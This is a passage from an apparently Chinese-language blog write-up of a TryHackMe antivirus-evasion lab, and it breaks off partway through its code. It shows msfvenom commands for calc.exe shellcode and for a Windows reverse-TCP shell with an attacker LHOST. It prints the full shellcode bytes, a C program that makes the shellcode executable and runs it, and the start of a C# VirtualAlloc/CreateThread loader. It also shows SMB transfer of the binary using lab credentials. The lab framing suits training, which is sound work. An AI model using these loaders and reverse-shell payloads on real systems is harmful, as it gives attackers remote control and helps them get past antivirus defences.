  <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xba</span>,
  <span class="hljs-number">0x19</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xbf</span>,
  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x55</span>,
  <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x2c</span>,
  <span class="hljs-number">0x34</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x0a</span>
};</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054622.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054623.png" alt></p>
<h1 id="0x05-生成shellcode">0x05 生成Shellcode</h1>
<h2 id="使用公开工具生成shellcode">使用公开工具生成shellcode</h2>
<p>我们可以使用特定的编程语言生成特定格式的Shellcode，这主要取决于我们自己，例如，如果我们的植入器(主exe文件)包含了将要发送给受害者的Shellcode，并且是用C编写的，那么我们就需要生成能够在C编程环境中工作的shellcode格式。</p>
<p>通过公开工具生成shellcode的优点是我们不需要从头开始编写自定义shellcode，甚至不需要了解很多的汇编语言知识，大多数公开的C2框架都会提供与C2平台兼容的自己的shellcode生成器。使用公开工具生成shellcode的缺点是大多数(或者可以说全部)可生成的shellcode都是AV软件供应商所熟知的，所以很容易被反病毒软件检测到。</p>
<p>我们可以在由Tryhackme所提供的AttackBox上使用Msfvenom，并生成能够执行Windows文件的shellcode，例如创建一个可运行<code>calc.exe</code>的Shellcode。</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Generate</span> Shellcode to Execute calc<span class="hljs-selector-class">.exe</span>
user<span class="hljs-keyword">@AttackBox</span>$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
No encoder specified, outputting raw payload
Payload <span class="hljs-attribute">size</span>: <span class="hljs-number">193</span> bytes
Final size of c <span class="hljs-attribute">file</span>: <span class="hljs-number">838</span> bytes
unsigned char buf[] = 
<span class="hljs-string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"</span>
<span class="hljs-string">"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"</span>
<span class="hljs-string">"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"</span>
<span class="hljs-string">"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"</span>
<span class="hljs-string">"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"</span>
<span class="hljs-string">"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"</span>
<span class="hljs-string">"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"</span>
<span class="hljs-string">"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"</span>
<span class="hljs-string">"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span>
<span class="hljs-string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"</span>
<span class="hljs-string">"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"</span>
<span class="hljs-string">"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"</span>
<span class="hljs-string">"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"</span>
<span class="hljs-string">"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"</span>;</code></pre>
<p>如下所示，我们使用Msf生成了一个能够执行Windows计算器程序(calc.exe)的Shellcode，Windows计算器被广泛用作恶意软件开发过程中的一个测试示例，这是一种POC(概念证明)展示，如果上述Shellcode成功生效，就会在相关的计算机上弹出一个Windows计算器程序实例。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054624.png" alt></p>
<h2 id="shellcode注入">Shellcode注入</h2>
<p>攻击者可以使用各种技术将shellcode注入到正在运行的或新的线程、进程中，通过使用Shellcode注入技术可以修改程序的正常执行流程，以更新程序的寄存器和函数来执行攻击者自己的代码。</p>
<p>我们刚才已经使用msf生成了一个简单的Shellcode，现在让我们在操作系统上执行它，以下是包含我们刚才所生成的Shellcode的C代码，该代码将被注入到内存中并最终会执行"calc.exe"。</p>
<p>tips：在AttackBox上，我们可以将以下内容保存在名为calc.c的文件中。</p>
<pre><code class="hljs c"><span class="hljs-comment">//vim calc.c</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
<span class="hljs-type">char</span> stager[] = {
<span class="hljs-string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"</span>
<span class="hljs-string">"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"</span>
<span class="hljs-string">"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"</span>
<span class="hljs-string">"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"</span>
<span class="hljs-string">"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"</span>
<span class="hljs-string">"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"</span>
<span class="hljs-string">"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"</span>
<span class="hljs-string">"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"</span>
<span class="hljs-string">"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"</span>
<span class="hljs-string">"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"</span>
<span class="hljs-string">"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"</span>
<span class="hljs-string">"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"</span>
<span class="hljs-string">"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"</span>
<span class="hljs-string">"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"</span> };
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
{
        DWORD oldProtect;
        VirtualProtect(stager, <span class="hljs-keyword">sizeof</span>(stager), PAGE_EXECUTE_READ, &amp;oldProtect);
        <span class="hljs-type">int</span> (*shellcode)() = (<span class="hljs-type">int</span>(*)())(<span class="hljs-type">void</span>*)stager;
        shellcode();
}</code></pre>
<p>我们需要继续对calc.c文件进行编译处理，以得到一个exe文件：</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Compile</span> our C program for Windows-为Windows系统编译C程序
user<span class="hljs-keyword">@AttackBox</span>$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054625.png" alt></p>
<p>在AttackBox中获得上述exe文件之后，我们可以将其传输到目标计算机(Windows)中并执行它。为了传输文件，我们可以在AttackBox中使用smbclient命令：</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Copy</span> calc-MSC<span class="hljs-selector-class">.exe</span> to Windows Machine
#通过smbclient命令访问\\MACHINE_IP\Tools处的SMB共享
<span class="hljs-selector-id">#10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.248</span><span class="hljs-selector-class">.184</span>
#用户：thm
#密码：Password321
user<span class="hljs-keyword">@AttackBox</span>$ smbclient -U thm <span class="hljs-string">'//10.10.248.184/Tools'</span>
<span class="hljs-attribute">smb</span>: \&gt; put calc-MSF.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054626.png" alt></p>
<p>如上所示，我们能够将calc-MSF.exe文件复制到目标Windows计算机的<code>C:\Tools\</code>目录中。</p>
<p>我们作为攻击者所构造的calc-MSF.exe在目标机器上的执行情况如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054627.png" alt></p>
<p>我们也可以在目标虚拟机中将calc-MSF.exe上传到THM Antivirus检查器页面(http://MACHINE_IP/)，看看此exe文件能否通过本文最终实验所涉及的反病毒检查。</p>
<p>注意：如果是在目标虚拟机上进行操作，我们也可以通过localhost访问到THM Antivirus检查器页面。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054628.png" alt></p>
<p>Metasploit框架有许多其他 shellcode 格式和类型，可以满足您的所有需求。我们强烈建议您进行更多实验，并通过生成不同的 shellcode 来扩展您的知识。</p>
<p>前面的示例展示了如何生成 shellcode 并在目标计算机中执行它。当然，您可以复制相同的步骤来创建不同类型的 shellcode，例如Meterpreter&nbsp;shellcode。</p>
<h2 id="生成原始shellcode">生成原始shellcode</h2>
<p>Shellcode也可以被存储在<code>.bin</code>文件中，这是一种原始数据格式，在这种情况下，我们可以使用<code>xxd -i</code>命令来获取相关的shellcode(我们得到的是二进制文件的十六进制表示)。</p>
<p>tips：.bin代表的是原始二进制文件。</p>
<p>让我们使用msfvenom创建一个原始二进制文件来获取shellcode：</p>
<pre><code class="hljs bash"><span class="hljs-comment">#Generate a Raw shellcode to Execute calc.exe</span>
user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw &gt; /tmp/example.bin
No encoder specified, outputting raw payload
Payload size: 193 bytes

user@AttackBox$ file /tmp/example.bin
/tmp/example.bin: data</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054629.png" alt></p>
<p>对我们刚才所创建的文件运行Linux中的<code>xxd</code>命令：</p>
<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~/tmp]</span>
└─$ xxd -<span class="hljs-selector-tag">i</span> example<span class="hljs-selector-class">.bin</span>                                                                                                   
unsigned char example_bin<span class="hljs-selector-attr">[]</span> = {
  <span class="hljs-number">0</span>xfc, <span class="hljs-number">0</span>xe8, <span class="hljs-number">0</span>x82, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x60, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>xe5, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>xc0, <span class="hljs-number">0</span>x64,
  <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x50, <span class="hljs-number">0</span>x30, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>x0c, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>x14, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x72, <span class="hljs-number">0</span>x28,
  <span class="hljs-number">0</span>x0f, <span class="hljs-number">0</span>xb7, <span class="hljs-number">0</span>x4a, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>xac, <span class="hljs-number">0</span>x3c, <span class="hljs-number">0</span>x61, <span class="hljs-number">0</span>x7c, <span class="hljs-number">0</span>x02, <span class="hljs-number">0</span>x2c,
  <span class="hljs-number">0</span>x20, <span class="hljs-number">0</span>xc1, <span class="hljs-number">0</span>xcf, <span class="hljs-number">0</span>x0d, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xc7, <span class="hljs-number">0</span>xe2, <span class="hljs-number">0</span>xf2, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>x57, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x52,
  <span class="hljs-number">0</span>x10, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x4a, <span class="hljs-number">0</span>x3c, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x4c, <span class="hljs-number">0</span>x11, <span class="hljs-number">0</span>x78, <span class="hljs-number">0</span>xe3, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xd1,
  <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x20, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xd3, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x49, <span class="hljs-number">0</span>x18, <span class="hljs-number">0</span>xe3, <span class="hljs-number">0</span>x3a, <span class="hljs-number">0</span>x49,
  <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x34, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xd6, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>xac, <span class="hljs-number">0</span>xc1, <span class="hljs-number">0</span>xcf, <span class="hljs-number">0</span>x0d, <span class="hljs-number">0</span>x01,
  <span class="hljs-number">0</span>xc7, <span class="hljs-number">0</span>x38, <span class="hljs-number">0</span>xe0, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>xf6, <span class="hljs-number">0</span>x03, <span class="hljs-number">0</span>x7d, <span class="hljs-number">0</span>xf8, <span class="hljs-number">0</span>x3b, <span class="hljs-number">0</span>x7d, <span class="hljs-number">0</span>x24, <span class="hljs-number">0</span>x75,
  <span class="hljs-number">0</span>xe4, <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x24, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xd3, <span class="hljs-number">0</span>x66, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x0c, <span class="hljs-number">0</span>x4b, <span class="hljs-number">0</span>x8b,
  <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x1c, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xd3, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x04, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>xd0, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>x44, <span class="hljs-number">0</span>x24,
  <span class="hljs-number">0</span>x24, <span class="hljs-number">0</span>x5b, <span class="hljs-number">0</span>x5b, <span class="hljs-number">0</span>x61, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x5a, <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>xe0, <span class="hljs-number">0</span>x5f, <span class="hljs-number">0</span>x5f, <span class="hljs-number">0</span>x5a,
  <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x12, <span class="hljs-number">0</span>xeb, <span class="hljs-number">0</span>x8d, <span class="hljs-number">0</span>x5d, <span class="hljs-number">0</span>x6a, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>x8d, <span class="hljs-number">0</span>x85, <span class="hljs-number">0</span>xb2, <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x00,
  <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x50, <span class="hljs-number">0</span>x68, <span class="hljs-number">0</span>x31, <span class="hljs-number">0</span>x8b, <span class="hljs-number">0</span>x6f, <span class="hljs-number">0</span>x87, <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>xd5, <span class="hljs-number">0</span>xbb, <span class="hljs-number">0</span>xf0, <span class="hljs-number">0</span>xb5,
  <span class="hljs-number">0</span>xa2, <span class="hljs-number">0</span>x56, <span class="hljs-number">0</span>x68, <span class="hljs-number">0</span>xa6, <span class="hljs-number">0</span>x95, <span class="hljs-number">0</span>xbd, <span class="hljs-number">0</span>x9d, <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>xd5, <span class="hljs-number">0</span>x3c, <span class="hljs-number">0</span>x06, <span class="hljs-number">0</span>x7c,
  <span class="hljs-number">0</span>x0a, <span class="hljs-number">0</span>x80, <span class="hljs-number">0</span>xfb, <span class="hljs-number">0</span>xe0, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>x05, <span class="hljs-number">0</span>xbb, <span class="hljs-number">0</span>x47, <span class="hljs-number">0</span>x13, <span class="hljs-number">0</span>x72, <span class="hljs-number">0</span>x6f, <span class="hljs-number">0</span>x6a,
  <span class="hljs-number">0</span>x00, <span class="hljs-number">0</span>x53, <span class="hljs-number">0</span>xff, <span class="hljs-number">0</span>xd5, <span class="hljs-number">0</span>x63, <span class="hljs-number">0</span>x61, <span class="hljs-number">0</span>x6c, <span class="hljs-number">0</span>x63, <span class="hljs-number">0</span>x2e, <span class="hljs-number">0</span>x65, <span class="hljs-number">0</span>x78, <span class="hljs-number">0</span>x65,
  <span class="hljs-number">0</span>x00
};
unsigned int example_bin_len = <span class="hljs-number">193</span>;</code></pre>
<p>如果我们将上面的输出结果与之前使用msf生成的Shellcode进行比较，就会发现它们是互相匹配的。</p>
<p>通常情况下，我们可能无法直接在目标计算机上执行一个二进制的<code>.bin</code>文件；因此，我们需要创建一个加载器或脚本，以便将<code>.bin</code>文件中的shellcode加载到目标机器的内存中并进行执行。</p>
<p>在下一小节中，我们在使用分阶段有效载荷时，就会创建一个加载器来将原始形式的shellcode加载到目标Windows机器的内存中并执行。</p>
<h1 id="0x06-有效载荷payload分段">0x06 有效载荷(Payload)分段</h1>
<p>为了成功绕过AV(反病毒)软件，我们可以思考应该怎样将最终的Shellcode传递给受害机器，根据不同的传递方法，我们会发现有效载荷通常可被分为无阶段有效载荷与分阶段有效载荷，在本小节内容中，我们将简单研究这两种有效载荷的差异以及各自的优点。</p>
<blockquote>
<p>Payload（有效载荷）是指在计算机安全中用于利用漏洞或者攻击目标的代码，它通常是指攻击者注入到受害计算机中的恶意代码。使用Payload的目的是为了实现攻击者的攻击要求，比如获取敏感信息、控制计算机系统或传播恶意软件等。</p>
<p>Shellcode是一种特殊类型的Payload，通常用于利用缓冲区溢出漏洞。Shellcode是一段精心编写的机器码，攻击者会通过利用程序或操作系统的弱点，将它注入到受攻击的计算机系统中并进行执行。Shellcode通常可用于获得系统命令执行的权限，以便攻击者进一步控制受感染的计算机。</p>
<p>简而言之：Shellcode是一种特定类型的Payload，通常会被用于实现对缓冲区溢出漏洞的利用，并会以机器码的形式注入到受攻击的计算机系统中。</p>
</blockquote>
<h2 id="无阶段有效载荷">无阶段有效载荷</h2>
<p>无阶段有效载荷会将最终的Shellcode直接嵌入到文件自身中，我们可以把它看作是一个打包的应用程序，该程序能够在一个单步骤进程中执行Shellcode。上文所介绍的Shellcode就是此形式：我们在一个可执行文件中嵌入了一个简单的用于执行calc.exe的Shellcode，这个过程就是在创建无阶段有效载荷。</p>
<p>在下面的示意图中，当目标用户执行恶意Payload文件时，嵌入式的Shellcode就会执行，从而为攻击者提供一个反向shell。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052054630.png" alt></p>
<p>例子：以下是一种使用msf所生成的无阶段有效载荷的简单方法。</p>
<p>在攻击机上使用msfvenom生成Shellcode，指定无阶段有效载荷<code>windows/x64/shell_reverse_tcp</code>：</p>
<pre><code class="hljs scss">#在AttackBox中进行操作，在实际使用以下命令时，请填充your IP的值为攻击机IP
msfvenom -<span class="hljs-selector-tag">p</span> windows/x64/shell_reverse_tcp LHOST=&lt;your IP&gt; LPORT=<span class="hljs-number">7478</span> -f raw

#执行这条命令我们将得到原始的十六进制字节形式的Shellcode，然后我们就可以将其填充到一个能够执行内存写入操作的C#程序中
#当然，我们也可以不使用-f raw而是使用-f csharp，这将生成C#代码，然后我们可以将此C#代码传输到受害机器上并进行编译执行(也可以先在攻击机上编译得到exe文件，随后再将exe文件传输到受害机器上执行)。</code></pre>
<p>将刚才得到的十六进制的Shellcode复制粘贴到以下C#程序中：</p>
<pre><code class="hljs c#"><span class="hljs-comment">//在目标Windows机器中创建该代码文件</span>
<span class="hljs-comment">//UnEncStagelessPayload.cs</span>

<span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Net;
<span class="hljs-keyword">using</span> System.Text;
<span class="hljs-keyword">using</span> System.Configuration.Install;
<span class="hljs-keyword">using</span> System.Runtime.InteropServices;
<span class="hljs-keyword">using</span> System.Security.Cryptography.X509Certificates;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span> {
  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;

  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="hljs-keyword">ref</span> UInt32 lpThreadId</span>)</span>;

  [<span class="hljs-meta">DllImport(<span class="hljs-string">"kernel32"</span>)</span>]
  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">WaitForSingleObject</span>(<span class="hljs-params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 MEM_COMMIT = <span class="hljs-number">0x1000</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>;

  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>()</span>
  {  <span class="hljs-comment">// 填充Shellcode内容</span>
    <span class="hljs-built_in">byte</span>[] shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[] {
<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x52</span>,
<span class="hljs-number">0x51</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x48</span>,
<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x0f</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc9</span>,
<span class="hljs-number">0x48</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0xac</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x7c</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x2c</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x0d</span>,<span class="hljs-number">0x41</span>,
<span class="hljs-number">0x01</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0xe2</span>,<span class="hljs-number">0xed</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x48</span>,
<span class="hljs-number">0x01</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x01</span>,
